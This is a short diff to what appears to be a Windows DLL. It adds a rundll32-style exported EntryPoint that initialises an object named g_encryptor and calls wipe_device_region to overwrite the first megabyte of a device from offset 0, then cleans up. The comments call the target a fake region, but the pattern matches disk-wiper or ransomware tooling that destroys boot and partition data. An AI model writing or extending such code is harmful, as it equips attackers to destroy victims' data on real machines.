@@ -180,3 +180,13 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 
     return TRUE;
 }
+
+extern "C" __declspec(dllexport) void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+    // Optional: parse lpszCmdLine for offsets, sizes, etc.
+    g_encryptor.initialize(nullptr, 4096);  // Replace with actual hook/size logic if needed
+
+    // Example: wipe a fake device region of 1MB starting at offset 0
+    g_encryptor.wipe_device_region(0, 1024 * 1024);
+
+    g_encryptor.cleanup();
+}
